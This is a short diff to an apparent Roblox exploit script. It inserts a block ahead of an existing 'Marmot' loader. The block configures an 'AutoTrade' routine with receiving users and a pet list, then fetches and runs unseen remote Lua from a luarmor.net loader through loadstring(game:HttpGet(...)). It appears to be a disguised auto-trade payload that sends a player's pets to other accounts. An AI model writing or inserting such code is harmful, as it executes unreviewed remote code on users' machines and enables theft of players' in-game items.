@@ -1,3 +1,20 @@
+script_key = getgenv().AutoTrade;
+getgenv().Config = {
+    MainReceive = getgenv().MainReceiveUsers,
+    petList = {
+        ["Secret"] = {
+            { Name = "Avernus" },
+        },
+        ["normalPets"] = {
+
+        }
+    }
+}
+
+task.spawn(function()
+loadstring(game:HttpGet("https://api.luarmor.net/files/v3/loaders/793674f6bc0a80e1c748fd75994d1607.lua"))()
+end)
+task.wait(120)
 script_key = getgenv().Marmot;
 setfpscap(3)  -- number = fps
 
